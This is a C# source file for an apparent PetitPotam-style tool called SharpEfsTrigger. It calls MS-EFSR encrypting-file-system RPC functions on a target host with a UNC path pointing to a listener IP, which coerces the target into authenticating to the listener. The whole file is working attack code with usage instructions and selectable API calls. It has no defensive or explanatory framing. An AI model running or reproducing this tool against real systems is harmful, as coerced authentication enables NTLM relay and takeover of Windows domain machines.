using System;

//https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/4a25b8e1-fd90-41b6-9301-62ed71334436 IDL for midl.exe
//https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/ccc4fb75-1c86-41d7-bbc4-b278ec13bfb8 EfsRpcOpenFileRaw -- patched
//https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/0d599976-758c-4dbd-ac8c-c9db2a922d76 EfsRpcEncryptFileSrv
//https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/043715de-caee-402a-a61b-921743337e78 EfsRpcDecryptFileSrv
//https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/cf759c00-1b90-4c33-9ace-f51c20149cea EfsRpcQueryRecoveryAgents
//https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/a058dc6c-bb7e-491c-9143-a5cb1f7e7cea EfsRpcQueryUsersOnFile
//https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/28609dad-5fa5-4af9-9382-18d40e3e9dec EfsRpcRemoveUsersFromFile
//https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/afd56d24-3732-4477-b5cf-44cc33848d85 EfsRpcAddUsersToFile

namespace SharpEfsTrigger
{
    internal class Program
    {
        private static void Main(string[] args)
        {
            string apicall = "EfsRpcOpenFileRaw";
            int result;
            if (args.Length < 2)
            {
                Console.WriteLine("usage: SharpEfsTriggeEfs.exe <Target IP> <Listener IP> <API call>");
                Console.WriteLine("usage: SharpEfsTriggeEfs.exe 192.168.1.10 192.168.1.250");
                Console.WriteLine("usage: SharpEfsTriggeEfs.exe 192.168.1.10 192.168.1.250 EfsRpcEncryptFileSrv");
                Console.WriteLine(@"Available API calls:
  EfsRpcOpenFileRaw
  EfsRpcEncryptFileSrv
  EfsRpcDecryptFileSrv
  EfsRpcQueryRecoveryAgents
  EfsRpcQueryUsersOnFile
  EfsRpcRemoveUsersFromFile
");
                return;
            }
            if (args.Length >= 3)
            {
                apicall = args[2];
            }
            if (IntPtr.Size == 8)
            {
                Console.WriteLine("NdrClientCall2x64");
            }
            else
            {
                Console.WriteLine("CallNdrClientCall2x86");
            }

            var Efs = new efs();
            IntPtr hHandle = IntPtr.Zero;
            try
            {
                //Efs.EfsRpcOpenFileRaw(args[0], out hHandle, string.Format("\\\\{0}\\test\\Settings.ini", args[1]), 0);
                //Efs.EfsRpcEncryptFileSrv(args[0], string.Format("\\\\{0}\\test\\Settings.ini", args[1]));
                //Efs.EfsRpcDecryptFileSrv(args[0], string.Format("\\\\{0}\\test\\Settings.ini", args[1]), 0);
                //Efs.EfsRpcQueryRecoveryAgents(args[0], string.Format("\\\\{0}\\test\\Settings.ini", args[1]), out hHandle);
                //Efs.EfsRpcQueryUsersOnFile(args[0], string.Format("\\\\{0}\\test\\Settings.ini", args[1]), out hHandle);
                //Efs.EfsRpcRemoveUsersFromFile(args[0], string.Format("\\\\{0}\\test\\Settings.ini", args[1]), out hHandle);
                //Efs.EfsRpcAddUsersToFile(args[0], string.Format("\\\\{0}\\test\\Settings.ini", args[1]), out hHandle); //Not working ?
                switch (apicall)
                {
                    case "EfsRpcOpenFileRaw":
                        apicall = "EfsRpcOpenFileRaw";
                        result = Efs.EfsRpcOpenFileRaw(args[0], out hHandle, string.Format("\\\\{0}\\test\\Settings.ini", args[1]), 0);
                        break;

                    case "EfsRpcEncryptFileSrv":
                        apicall = "EfsRpcEncryptFileSrv";
                        result = Efs.EfsRpcEncryptFileSrv(args[0], string.Format("\\\\{0}\\test\\Settings.ini", args[1]));
                        break;

                    case "EfsRpcDecryptFileSrv":
                        apicall = "EfsRpcDecryptFileSrv";
                        result = Efs.EfsRpcDecryptFileSrv(args[0], string.Format("\\\\{0}\\test\\Settings.ini", args[1]), 0);
                        break;

                    case "EfsRpcQueryRecoveryAgents":
                        apicall = "EfsRpcQueryRecoveryAgents";
                        result = Efs.EfsRpcQueryRecoveryAgents(args[0], string.Format("\\\\{0}\\test\\Settings.ini", args[1]), out hHandle);
                        break;

                    case "EfsRpcQueryUsersOnFile":
                        apicall = "EfsRpcQueryUsersOnFile";
                        result = Efs.EfsRpcQueryUsersOnFile(args[0], string.Format("\\\\{0}\\test\\Settings.ini", args[1]), out hHandle);
                        break;

                    case "EfsRpcRemoveUsersFromFile":
                        apicall = "EfsRpcRemoveUsersFromFile";
                        result = Efs.EfsRpcRemoveUsersFromFile(args[0], string.Format("\\\\{0}\\test\\Settings.ini", args[1]), out hHandle);
                        break;

                    //case "EfsRpcAddUsersToFile":
                    //    Efs.EfsRpcAddUsersToFile(args[0], string.Format("\\\\{0}\\test\\Settings.ini", args[1]), out hHandle); //Not working ?
                    //    break;

                    default:
                        apicall = "EfsRpcOpenFileRaw";
                        result = Efs.EfsRpcOpenFileRaw(args[0], out hHandle, string.Format("\\\\{0}\\test\\Settings.ini", args[1]), 0);
                        break;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
                return;
            }
            Console.WriteLine($"[*]{apicall}: 5");
        }
    }
}